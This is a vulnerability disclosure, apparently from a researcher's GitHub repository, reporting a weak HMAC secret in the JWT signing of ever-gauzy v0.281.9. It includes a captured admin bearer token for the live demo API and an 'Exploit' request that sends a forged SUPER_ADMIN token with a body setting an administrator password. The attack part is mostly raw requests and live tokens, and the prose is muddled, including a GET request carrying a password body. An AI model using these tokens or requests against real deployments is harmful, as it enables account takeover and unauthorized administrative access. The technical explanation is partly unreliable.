## [ever-gauzy-v0.281.9-JWT weak HMAC secret vulnerability](https://github.com/ever-co/ever-gauzy/releases/tag/v0.281.9)

## [Vendor](https://gauzy.co/)

![](https://github.com/nu11secur1ty/CVE-nu11secur1ty/blob/main/vendors/gauzy.co/2023/ever-gauzy-v0.281.9/docs/Screenshot%202023-04-08%20222331.png)

## Description:
It was, detected a JWT signed using a well-known `HMAC secret key`. 
The key used which was found was a secret Key.
The user can find a secret key authentication while sending normal post requests. 
After he found the `Authorization: Bearer` key he can use it to authenticate
and he can be sending a very malicious POST request, it depends on the scenario. 

STATUS: 

[+]Issue:     JWT weak HMAC secret

[+]Severity:  High

Where the `Authorization: Bearer` key is stored:
```URL
https://apidemo.gauzy.co/api/auth/authenticated
```

[+]Request:
```HTTP
GET /api/auth/authenticated HTTP/2
Host: apidemo.gauzy.co
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Accept: application/json, text/plain, */*
Language: en
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6ImY2Y2Y2ZWU2LTI5M2ItNDIyMy05N2I2LWU1ZDk1MzJmNTlhMSIsInRlbmFudElkIjoiMDJjMzMxNjEtYjBlMS00YmZiLTgyZGYtYjdmOGZmZDhiZjczIiwiZW1wbG95ZWVJZCI6bnVsbCwicm9sZSI6IkFETUlOIiwicGVybWlzc2lvbnMiOlsiQURNSU5fREFTSEJPQVJEX1ZJRVciLCJURUFNX0RBU0hCT0FSRCIsIlBST0pFQ1RfTUFOQUdFTUVOVF9EQVNIQk9BUkQiLCJUSU1FX1RSQUNLSU5HX0RBU0hCT0FSRCIsIkFDQ09VTlRJTkdfREFTSEJPQVJEIiwiSFVNQU5fUkVTT1VSQ0VfREFTSEJPQVJEIiwiT1JHX1BBWU1FTlRfVklFVyIsIk9SR19QQVlNRU5UX0FERF9FRElUIiwiT1JHX0lOQ09NRVNfVklFVyIsIk9SR19JTkNPTUVTX0VESVQiLCJPUkdfRVhQRU5TRVNfVklFVyIsIk9SR19FWFBFTlNFU19FRElUIiwiUFJPRklMRV9FRElUIiwiRU1QTE9ZRUVfRVhQRU5TRVNfVklFVyIsIkVNUExPWUVFX0VYUEVOU0VTX0VESVQiLCJPUkdfUFJPUE9TQUxTX1ZJRVciLCJPUkdfUFJPUE9TQUxTX0VESVQiLCJPUkdfUFJPUE9TQUxfVEVNUExBVEVTX1ZJRVciLCJPUkdfUFJPUE9TQUxfVEVNUExBVEVTX0VESVQiLCJPUkdfVEFTS19BREQiLCJPUkdfVEFTS19WSUVXIiwiT1JHX1RBU0tfRURJVCIsIk9SR19UQVNLX0RFTEVURSIsIk9SR19USU1FX09GRl9WSUVXIiwiT1JHX0VNUExPWUVFU19WSUVXIiwiT1JHX0VNUExPWUVFU19FRElUIiwiT1JHX0NBTkRJREFURVNfVklFVyIsIk9SR19DQU5ESURBVEVTX0VESVQiLCJPUkdfQ0FORElEQVRFU19JTlRFUlZJRVdfRURJVCIsIk9SR19DQU5ESURBVEVTX0lOVEVSVklFV19WSUVXIiwiT1JHX0NBTkRJREFURVNfRE9DVU1FTlRTX1ZJRVciLCJPUkdfQ0FORElEQVRFU19UQVNLX0VESVQiLCJPUkdfQ0FORElEQVRFU19GRUVEQkFDS19FRElUIiwiT1JHX0lOVkVOVE9SWV9QUk9EVUNUX0VESVQiLCJPUkdfSU5WRU5UT1JZX1ZJRVciLCJPUkdfVEFHU19BREQiLCJPUkdfVEFHU19WSUVXIiwiT1JHX1RBR1NfRURJVCIsIk9SR19UQUdTX0RFTEVURSIsIk9SR19VU0VSU19WSUVXIiwiT1JHX1VTRVJTX0VESVQiLCJPUkdfSU5WSVRFX1ZJRVciLCJPUkdfSU5WSVRFX0VESVQiLCJBTExfT1JHX1ZJRVciLCJBTExfT1JHX0VESVQiLCJQT0xJQ1lfVklFVyIsIlBPTElDWV9FRElUIiwiVElNRV9PRkZfRURJVCIsIlJFUVVFU1RfQVBQUk9WQUxfVklFVyIsIlJFUVVFU1RfQVBQUk9WQUxfRURJVCIsIkFQUFJPVkFMU19QT0xJQ1lfVklFVyIsIkFQUFJPVkFMU19QT0xJQ1lfRURJVCIsIkNIQU5HRV9TRUxFQ1RFRF9FTVBMT1lFRSIsIkNIQU5HRV9TRUxFQ1RFRF9DQU5ESURBVEUiLCJDSEFOR0VfU0VMRUNURURfT1JHQU5JWkFUSU9OIiwiQ0hBTkdFX1JPTEVTX1BFUk1JU1NJT05TIiwiQUNDRVNTX1BSSVZBVEVfUFJPSkVDVFMiLCJUSU1FU0hFRVRfRURJVF9USU1FIiwiUFVCTElDX1BBR0VfRURJVCIsIklOVk9JQ0VTX1ZJRVciLCJJTlZPSUNFU19FRElUIiwiRVNUSU1BVEVTX1ZJRVciLCJFU1RJTUFURVNfRURJVCIsIk9SR19DQU5ESURBVEVTX0lOVEVSVklFV0VSU19FRElUIiwiT1JHX0NBTkRJREFURVNfSU5URVJWSUVXRVJTX1ZJRVciLCJWSUVXX0FMTF9FTUFJTFMiLCJWSUVXX0FMTF9FTUFJTF9URU1QTEFURVMiLCJPUkdfSEVMUF9DRU5URVJfRURJVCIsIlZJRVdfU0FMRVNfUElQRUxJTkVTIiwiRURJVF9TQUxFU19QSVBFTElORVMiLCJDQU5fQVBQUk9WRV9USU1FU0hFRVQiLCJPUkdfU1BSSU5UX1ZJRVciLCJPUkdfU1BSSU5UX0VESVQiLCJPUkdfQ09OVEFDVF9FRElUIiwiT1JHX0NPTlRBQ1RfVklFVyIsIk9SR19QUk9KRUNUX0FERCIsIk9SR19QUk9KRUNUX1ZJRVciLCJPUkdfUFJPSkVDVF9FRElUIiwiT1JHX1BST0pFQ1RfREVMRVRFIiwiT1JHX1RFQU1fQUREIiwiT1JHX1RFQU1fVklFVyIsIk9SR19URUFNX0VESVQiLCJPUkdfVEVBTV9ERUxFVEUiLCJPUkdfVEVBTV9KT0lOX1JFUVVFU1RfVklFVyIsIk9SR19URUFNX0pPSU5fUkVRVUVTVF9FRElUIiwiT1JHX0NPTlRSQUNUX0VESVQiLCJFVkVOVF9UWVBFU19WSUVXIiwiVElNRV9UUkFDS0VSIiwiVEVOQU5UX0FERF9FWElTVElOR19VU0VSIiwiSU5URUdSQVRJT05fVklFVyIsIkZJTEVfU1RPUkFHRV9WSUVXIiwiUEFZTUVOVF9HQVRFV0FZX1ZJRVciLCJTTVNfR0FURVdBWV9WSUVXIiwiQ1VTVE9NX1NNVFBfVklFVyIsIklNUE9SVF9FWFBPUlRfVklFVyIsIk1JR1JBVEVfR0FVWllfQ0xPVUQiLCJPUkdfSk9CX0VNUExPWUVFX1ZJRVciLCJPUkdfSk9CX01BVENISU5HX1ZJRVciLCJJTlZFTlRPUllfR0FMTEVSWV9BREQiLCJJTlZFTlRPUllfR0FMTEVSWV9WSUVXIiwiSU5WRU5UT1JZX0dBTExFUllfRURJVCIsIklOVkVOVE9SWV9HQUxMRVJZX0RFTEVURSIsIk1FRElBX0dBTExFUllfQUREIiwiTUVESUFfR0FMTEVSWV9WSUVXIiwiTUVESUFfR0FMTEVSWV9FRElUIiwiTUVESUFfR0FMTEVSWV9ERUxFVEUiLCJPUkdfRVFVSVBNRU5UX1ZJRVciLCJPUkdfRVFVSVBNRU5UX0VESVQiLCJPUkdfRVFVSVBNRU5UX1NIQVJJTkdfVklFVyIsIk9SR19FUVVJUE1FTlRfU0hBUklOR19FRElUIiwiRVFVSVBNRU5UX01BS0VfUkVRVUVTVCIsIkVRVUlQTUVOVF9BUFBST1ZFX1JFUVVFU1QiLCJPUkdfUFJPRFVDVF9UWVBFU19WSUVXIiwiT1JHX1BST0RVQ1RfVFlQRVNfRURJVCIsIk9SR19QUk9EVUNUX0NBVEVHT1JJRVNfVklFVyIsIk9SR19QUk9EVUNUX0NBVEVHT1JJRVNfRURJVCIsIlZJRVdfQUxMX0FDQ09VTlRJTkdfVEVNUExBVEVTIiwiVEVOQU5UX1NFVFRJTkciLCJBTExPV19ERUxFVEVfVElNRSIsIkFMTE9XX01PRElGWV9USU1FIiwiQUxMT1dfTUFOVUFMX1RJTUUiLCJERUxFVEVfU0NSRUVOU0hPVFMiXSwiaWF0IjoxNjgxMTkzNjIzfQ.hHj-RPWoBGG3NfxtF4VE4twqK2W2JEbt4ZydwkWO0g4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.gauzy.co
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.gauzy.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.
```
[+]TResponse:
```HTTP
HTTP/2 200 OK
Date: Tue, 11 Apr 2023 06:20:32 GMT
Content-Type: text/html; charset=utf-8
Cf-Ray: 7b611fcf0a333130-SOF
Access-Control-Allow-Origin: *
Set-Cookie: connect.sid=s%3AWboYoUfjtPHyv5wv4bFwglPKvMgoG7pG.2qJUWhln4wKpuzGW2aw6bJLQeRd8M9SYJHYwG%2Bc%2FmmI; Path=/; HttpOnly
Strict-Transport-Security: max-age=0; includeSubDomains; preload
Cf-Cache-Status: DYNAMIC
Access-Control-Allow-Credentials: true
Content-Security-Policy: default-src 'self';base-uri 'self';block-all-mixed-content;font-src 'self' https: data:;frame-ancestors 'self';img-src 'self' data:;object-src 'none';script-src 'self';script-src-attr 'none';style-src 'self' https: 'unsafe-inline';upgrade-insecure-requests
Expect-Ct: max-age=0
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-Dns-Prefetch-Control: off
X-Download-Options: noopen
X-Frame-Options: SAMEORIGIN
X-Permitted-Cross-Domain-Policies: none
X-Ratelimit-Limit: 300
X-Ratelimit-Remaining: 299
X-Ratelimit-Reset: 60
X-Xss-Protection: 0
Report-To: {"endpoints":[{"url":"https:\/\/a.nel.cloudflare.com\/report\/v3?s=7t1h309ma7DgT3IJYmx66Mgo3GGEehmfgEKnVAmkHaKUgwi1GeZRhOGzs3TJfpGR%2FJjcCdA%2B8iqKhOHidi7mglEH3QYtKG4Zx3BeQyhAg11fTcHqO0ydp8vd8%2BlNMRWjYaL9"}],"group":"cf-nel","max_age":604800}
Nel: {"success_fraction":0,"report_to":"cf-nel","max_age":604800}
Vary: Accept-Encoding
Server: cloudflare
Alt-Svc: h3=":443"; ma=86400, h3-29=":443"; ma=86400

true
```

[+]Exploit:
```GET
GET /api/auth/authenticated HTTP/2
Host: apidemo.gauzy.co
Sec-Ch-Ua: "Not:A-Brand";v="99", "Chromium";v="112"
Accept: application/json, text/plain, */*
Language: en
Sec-Ch-Ua-Mobile: ?0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjJjMWViM2ViLTI3ZDEtNGE2Ni05YjEzLTg4ODVhNmFhYWJlMiIsInRlbmFudElkIjoiMTA0YjhiMDQtNmYzNi00YWMzLWFjNWItNTg4MWQyNjJmMWUxIiwiZW1wbG95ZWVJZCI6bnVsbCwicm9sZSI6IlNVUEVSX0FETUlOIiwicGVybWlzc2lvbnMiOlsiQURNSU5fREFTSEJPQVJEX1ZJRVciLCJURUFNX0RBU0hCT0FSRCIsIlBST0pFQ1RfTUFOQUdFTUVOVF9EQVNIQk9BUkQiLCJUSU1FX1RSQUNLSU5HX0RBU0hCT0FSRCIsIkFDQ09VTlRJTkdfREFTSEJPQVJEIiwiSFVNQU5fUkVTT1VSQ0VfREFTSEJPQVJEIiwiT1JHX1BBWU1FTlRfVklFVyIsIk9SR19QQVlNRU5UX0FERF9FRElUIiwiT1JHX0lOQ09NRVNfVklFVyIsIk9SR19JTkNPTUVTX0VESVQiLCJPUkdfRVhQRU5TRVNfVklFVyIsIk9SR19FWFBFTlNFU19FRElUIiwiUFJPRklMRV9FRElUIiwiRU1QTE9ZRUVfRVhQRU5TRVNfVklFVyIsIkVNUExPWUVFX0VYUEVOU0VTX0VESVQiLCJPUkdfUFJPUE9TQUxTX1ZJRVciLCJPUkdfUFJPUE9TQUxTX0VESVQiLCJPUkdfUFJPUE9TQUxfVEVNUExBVEVTX1ZJRVciLCJPUkdfUFJPUE9TQUxfVEVNUExBVEVTX0VESVQiLCJPUkdfVEFTS19BREQiLCJPUkdfVEFTS19WSUVXIiwiT1JHX1RBU0tfRURJVCIsIk9SR19UQVNLX0RFTEVURSIsIk9SR19USU1FX09GRl9WSUVXIiwiT1JHX0VNUExPWUVFU19WSUVXIiwiT1JHX0VNUExPWUVFU19FRElUIiwiT1JHX0NBTkRJREFURVNfVklFVyIsIk9SR19DQU5ESURBVEVTX0VESVQiLCJPUkdfQ0FORElEQVRFU19JTlRFUlZJRVdfRURJVCIsIk9SR19DQU5ESURBVEVTX0lOVEVSVklFV19WSUVXIiwiT1JHX0NBTkRJREFURVNfRE9DVU1FTlRTX1ZJRVciLCJPUkdfQ0FORElEQVRFU19UQVNLX0VESVQiLCJPUkdfQ0FORElEQVRFU19GRUVEQkFDS19FRElUIiwiT1JHX0lOVkVOVE9SWV9QUk9EVUNUX0VESVQiLCJPUkdfSU5WRU5UT1JZX1ZJRVciLCJPUkdfVEFHU19BREQiLCJPUkdfVEFHU19WSUVXIiwiT1JHX1RBR1NfRURJVCIsIk9SR19UQUdTX0RFTEVURSIsIk9SR19VU0VSU19WSUVXIiwiT1JHX1VTRVJTX0VESVQiLCJPUkdfSU5WSVRFX1ZJRVciLCJPUkdfSU5WSVRFX0VESVQiLCJBTExfT1JHX1ZJRVciLCJBTExfT1JHX0VESVQiLCJQT0xJQ1lfVklFVyIsIlBPTElDWV9FRElUIiwiVElNRV9PRkZfRURJVCIsIlJFUVVFU1RfQVBQUk9WQUxfVklFVyIsIlJFUVVFU1RfQVBQUk9WQUxfRURJVCIsIkFQUFJPVkFMU19QT0xJQ1lfVklFVyIsIkFQUFJPVkFMU19QT0xJQ1lfRURJVCIsIkNIQU5HRV9TRUxFQ1RFRF9FTVBMT1lFRSIsIkNIQU5HRV9TRUxFQ1RFRF9DQU5ESURBVEUiLCJDSEFOR0VfU0VMRUNURURfT1JHQU5JWkFUSU9OIiwiQ0hBTkdFX1JPTEVTX1BFUk1JU1NJT05TIiwiQUNDRVNTX1BSSVZBVEVfUFJPSkVDVFMiLCJUSU1FU0hFRVRfRURJVF9USU1FIiwiU1VQRVJfQURNSU5fRURJVCIsIlBVQkxJQ19QQUdFX0VESVQiLCJJTlZPSUNFU19WSUVXIiwiSU5WT0lDRVNfRURJVCIsIkVTVElNQVRFU19WSUVXIiwiRVNUSU1BVEVTX0VESVQiLCJPUkdfQ0FORElEQVRFU19JTlRFUlZJRVdFUlNfRURJVCIsIk9SR19DQU5ESURBVEVTX0lOVEVSVklFV0VSU19WSUVXIiwiVklFV19BTExfRU1BSUxTIiwiVklFV19BTExfRU1BSUxfVEVNUExBVEVTIiwiT1JHX0hFTFBfQ0VOVEVSX0VESVQiLCJWSUVXX1NBTEVTX1BJUEVMSU5FUyIsIkVESVRfU0FMRVNfUElQRUxJTkVTIiwiQ0FOX0FQUFJPVkVfVElNRVNIRUVUIiwiT1JHX1NQUklOVF9WSUVXIiwiT1JHX1NQUklOVF9FRElUIiwiT1JHX0NPTlRBQ1RfRURJVCIsIk9SR19DT05UQUNUX1ZJRVciLCJPUkdfUFJPSkVDVF9BREQiLCJPUkdfUFJPSkVDVF9WSUVXIiwiT1JHX1BST0pFQ1RfRURJVCIsIk9SR19QUk9KRUNUX0RFTEVURSIsIk9SR19URUFNX0FERCIsIk9SR19URUFNX1ZJRVciLCJPUkdfVEVBTV9FRElUIiwiT1JHX1RFQU1fREVMRVRFIiwiT1JHX1RFQU1fSk9JTl9SRVFVRVNUX1ZJRVciLCJPUkdfVEVBTV9KT0lOX1JFUVVFU1RfRURJVCIsIk9SR19DT05UUkFDVF9FRElUIiwiRVZFTlRfVFlQRVNfVklFVyIsIlRJTUVfVFJBQ0tFUiIsIlRFTkFOVF9BRERfRVhJU1RJTkdfVVNFUiIsIklOVEVHUkFUSU9OX1ZJRVciLCJGSUxFX1NUT1JBR0VfVklFVyIsIlBBWU1FTlRfR0FURVdBWV9WSUVXIiwiU01TX0dBVEVXQVlfVklFVyIsIkNVU1RPTV9TTVRQX1ZJRVciLCJJTVBPUlRfRVhQT1JUX1ZJRVciLCJNSUdSQVRFX0dBVVpZX0NMT1VEIiwiT1JHX0pPQl9FTVBMT1lFRV9WSUVXIiwiT1JHX0pPQl9NQVRDSElOR19WSUVXIiwiSU5WRU5UT1JZX0dBTExFUllfQUREIiwiSU5WRU5UT1JZX0dBTExFUllfVklFVyIsIklOVkVOVE9SWV9HQUxMRVJZX0VESVQiLCJJTlZFTlRPUllfR0FMTEVSWV9ERUxFVEUiLCJNRURJQV9HQUxMRVJZX0FERCIsIk1FRElBX0dBTExFUllfVklFVyIsIk1FRElBX0dBTExFUllfRURJVCIsIk1FRElBX0dBTExFUllfREVMRVRFIiwiT1JHX0VRVUlQTUVOVF9WSUVXIiwiT1JHX0VRVUlQTUVOVF9FRElUIiwiT1JHX0VRVUlQTUVOVF9TSEFSSU5HX1ZJRVciLCJPUkdfRVFVSVBNRU5UX1NIQVJJTkdfRURJVCIsIkVRVUlQTUVOVF9NQUtFX1JFUVVFU1QiLCJFUVVJUE1FTlRfQVBQUk9WRV9SRVFVRVNUIiwiT1JHX1BST0RVQ1RfVFlQRVNfVklFVyIsIk9SR19QUk9EVUNUX1RZUEVTX0VESVQiLCJPUkdfUFJPRFVDVF9DQVRFR09SSUVTX1ZJRVciLCJPUkdfUFJPRFVDVF9DQVRFR09SSUVTX0VESVQiLCJWSUVXX0FMTF9BQ0NPVU5USU5HX1RFTVBMQVRFUyIsIlRFTkFOVF9TRVRUSU5HIiwiQUxMT1dfREVMRVRFX1RJTUUiLCJBTExPV19NT0RJRllfVElNRSIsIkFMTE9XX01BTlVBTF9USU1FIiwiREVMRVRFX1NDUkVFTlNIT1RTIl0sImlhdCI6MTY4MDk4MDAzMn0.3zm2CQ0udVj5VCBYgPPD8BzkhQ_5TgVVi91sN7eMKlw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://demo.gauzy.co
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://demo.gauzy.co/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Length: 76

{
	"email":"local.admin@ever.co",
	"password": "adminrrrrrrrrrrrrrrrrrrrrrHACKED"
}

```

## Reference and What it is:
[href](https://www.okta.com/identity-101/hmac/)

[href](https://cloud.google.com/storage/docs/authentication/hmackeys)

[href](https://portswigger.net/kb/issues/00200903_jwt-weak-hmac-secret)

## Reproduce:
[href](https://github.com/nu11secur1ty/CVE-nu11secur1ty/tree/main/vendors/gauzy.co/2023/ever-gauzy-v0.281.9)

## Proof and Exploit:
[href](https://streamable.com/afsmee)

## Time spend:
03:37:00
